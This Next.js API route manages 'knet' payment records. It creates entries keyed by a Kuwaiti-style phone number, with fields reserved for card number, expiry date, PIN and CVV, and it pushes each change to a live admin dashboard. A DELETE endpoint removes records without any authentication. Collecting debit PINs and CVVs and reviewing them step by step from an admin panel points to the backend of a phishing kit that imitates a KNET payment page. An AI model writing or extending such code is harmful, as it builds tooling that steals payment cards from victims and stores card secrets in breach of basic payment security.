import { type NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/db";
import { scheduleAdminRealtimeBroadcast } from "@/lib/admin-realtime-hub";

export const dynamic = "force-dynamic";

export async function DELETE(req: NextRequest) {
  try {
    const body = (await req.json()) as { id?: string };
    if (body.id) {
      await prisma.knet.delete({ where: { id: body.id } }).catch(() => {});
    }
    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ ok: true });
  }
}

export async function POST(req: Request) {
  try {
    const body = (await req.json()) as { phone?: string; amount?: number; id?: string };
    const phone = String(body.phone ?? "").replace(/\D/g, "").slice(0, 8);
    const amount = Math.round(Number(body.amount) || 0);

    if (body.id) {
      await prisma.knet.update({
        where: { id: body.id },
        data: { ...(phone ? { phone } : {}), ...(amount > 0 ? { amount } : {}), updatedAt: new Date() },
      });
      scheduleAdminRealtimeBroadcast();
      return NextResponse.json({ ok: true, id: body.id });
    }

    if (!phone) {
      return NextResponse.json({ ok: false, code: "invalid_phone" }, { status: 400 });
    }

    const record = await prisma.knet.create({
      data: {
        phone,
        amount: amount || 0,
        cardNumber: "",
        expiryDate: "",
        pin: "",
        cvv: "",
        status: "pending",
        reviewStep: "awaiting_phone",
        createdAt: new Date(),
        updatedAt: new Date(),
      },
    });

    scheduleAdminRealtimeBroadcast();
    return NextResponse.json({ ok: true, id: record.id });
  } catch (error) {
    console.error("[quick-pay/init]", error instanceof Error ? error.message : error);
    return NextResponse.json({ ok: false, code: "generic" }, { status: 500 });
  }
}
